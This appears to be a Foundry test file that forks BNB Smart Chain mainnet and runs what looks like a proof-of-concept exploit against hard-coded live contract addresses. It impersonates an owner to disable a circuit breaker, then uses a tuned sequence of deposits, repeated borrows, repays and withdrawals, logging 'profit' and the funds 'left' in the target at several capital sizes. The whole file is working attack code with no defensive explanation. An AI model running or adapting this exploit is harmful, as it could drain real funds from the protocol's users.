// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Test, console2} from "forge-std/Test.sol";
interface IERC20C { function approve(address,uint256) external; function balanceOf(address) external view returns (uint256); }
interface IHC { function deposit(uint256,bool) external; function borrow(uint256,bool) external; function withdraw(uint256,bool) external; function repay(uint256,bool) external; }
interface ITMC { function setCircuitBreaker(bool) external; }
contract BSCUSDCTest is Test {
    address constant TM=0x8010F9E14C8286B9312e624370fdDC07fee2Fc75;
    address constant H=0xBA9De5a8FD91408826616f2d6d7470A11E34c9F0;
    address constant T=0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant OWNER=0xf357a08C8D4A385Cebddb517a44b210A0F6b3393;
    function setUp() public { vm.createSelectFork("https://bsc-rpc.publicnode.com"); }
    function run(uint256 D) internal {
        vm.prank(OWNER); ITMC(TM).setCircuitBreaker(false);
        uint256 h0=IERC20C(T).balanceOf(H);
        deal(T, address(this), D);
        IERC20C(T).approve(H, type(uint256).max);
        uint256 a=D;
        IHC(H).deposit(a*2995/1_000_000,false);
        IHC(H).deposit(a*11964/1_000_000,false);
        IHC(H).deposit(a*44327/1_000_000,false);
        IHC(H).deposit(a*178736/1_000_000,false);
        IHC(H).deposit(a - a*2995/1_000_000 - a*11964/1_000_000 - a*44327/1_000_000 - a*178736/1_000_000,false);
        IHC(H).deposit(0,false);
        for (uint i=0;i<20;i++) IHC(H).borrow(a*37/1000,false);
        for (uint i=0;i<20;i++){ IHC(H).repay(a*37/1000,false); IHC(H).withdraw(a*5/100,false); }
        IHC(H).repay(type(uint256).max,false);
        uint256 bal=IERC20C(T).balanceOf(H);
        if (bal>0) IHC(H).withdraw(bal,false);
        uint256 endb=IERC20C(T).balanceOf(address(this));
        console2.log("D",D); console2.log("  h0",h0); console2.log("  end",endb); console2.log("  profit",endb>D?endb-D:0); console2.log("  left",IERC20C(T).balanceOf(H));
    }
    function test_D4() public { run(4_000_000e18); }
    function test_D6() public { run(6_000_000e18); }
    function test_D8() public { run(8_000_000e18); }
    function test_D10() public { run(10_000_000e18); }
}
